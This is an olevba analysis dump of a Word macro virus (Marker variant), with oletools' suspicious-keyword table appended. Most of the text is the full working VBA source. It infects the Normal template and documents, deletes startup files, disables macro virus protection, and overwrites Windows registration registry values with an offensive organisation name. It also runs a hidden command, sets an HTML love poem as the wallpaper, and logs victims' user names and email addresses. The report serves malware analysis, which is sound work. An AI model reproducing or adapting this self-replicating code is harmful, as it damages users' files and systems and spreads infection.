olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ay-6132a5622fe7b4fe41d6376bc7f25e49a277d05c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ay-6132a5622fe7b4fe41d6376bc7f25e49a277d05c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest"
Private Sub AutoClose()
Document_Close
End Sub
Private Sub FileOpen()
WordBasic.disableautomacros True
If Dialogs(80).Show <> 0 Then Document_Open
End Sub
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.*"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString Jon
   For Each nmod In NormalTemplate.VBProject.VBComponents
    If Not nmod.Name = "ThisDocument" Then _
       Application.OrganizerDelete NormalTemplate.FullName, nmod.Name, 3
   Next
   NormalTemplate.VBProject.VBComponents.Add vbext_ct_StdModule
   For Each nmod In NormalTemplate.VBProject.VBComponents
    If Not nmod.Name = "ThisDocument" Then
      nmod.Name = "NewMacros"
      isd = "Private Sub AutoExec" & Chr(13) & _
      "On Error Resume Next" & Chr(13) & _
      "Dim Chri" & Chr(13) & _
      "Chri = System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductName" & Chr(34) & ")" & Chr(13) & _
      "If Not Chri = " & Chr(34) & "JonMMx 2000" & Chr(34) & " Then" & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductName" & Chr(34) & ") = " & Chr(34) & "JonMMx 2000" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductID" & Chr(34) & ") = " & Chr(34) & "10701-OEM-0010907-06212" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "ProductKey" & Chr(34) & ") = " & Chr(34) & "D4EST-R9OY9-6YOU9-R9C68-OM2P3" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "RegisteredOrganization" & Chr(34) & ") = " & Chr(34) & "fUCK up Your Live" & Chr(34) & Chr(13) & _
      "   System.PrivateProfileString(" & Chr(34) & Chr(34) & ", " & Chr(34) & "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion" & Chr(34) & ", " & Chr(34) & "RegisteredOwner" & Chr(34) & ") = " & Chr(34) & "JonMMx 2000" & Chr(34) & Chr(13) & _
      "   Shell " & Chr(34) & "Command.Com /c scanreg.exe /backup" & Chr(34) & ", vbHide" & Chr(13) & _
      "End If" & Chr(13) & _
      "End Sub" & Chr(13) & _
      "Private Sub ViewVBCode" & Chr(13) & _
      "End Sub" & Chr(13) & _
      "Private Sub ToolsMacro" & Chr(13) & _
      "End Sub"
      NormalTemplate.VBProject.VBComponents(2).CodeModule.AddFromString isd
     End If
   Next
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString Jon
    For Each nmod In ActiveDocument.VBProject.VBComponents
     If Not nmod.Name = "ThisDocument" Then _
       Application.OrganizerDelete ActiveDocument.FullName, nmod.Name, 3
    Next
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
End Sub
'Logfile -->


' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' Jon MMx 2000
' jonthebest@hotbot.com

' 03:57:4015:57:40 -Senin, 5 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:03:316:03:03 -Senin, 5 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:05:1613:05:16 -Selasa, 6 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 



' 11:05:2511:05:25 -Kamis, 8 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:23:2722:23:27 -Minggu, 13 Des 1998
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:53:518:53:51 PM PM-Wednesday, 28 Jul 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:47:268:47:26 AM AM-Saturday, 7 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:49:56:49:05 PM PM-Tuesday, 10 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:52:337:52:33 -Kamis, 12 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:08:68:08:06 AM AM-Monday, 23 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:48:37:48:03  SIANG-Kamis, 2 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:26:1423:26:14  MALAM-Jumat, 10 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:04:1010:04:10 AM AM-Saturday, 2 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:29:228:29:22 PM PM-Thursday, 28 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:18:66:18:06 AM AM-Friday, 29 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:2014:16:20 -Samstag, 2 Jan 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:40:1409:40:14 -Freitag, 12 Okt 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |scanreg.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
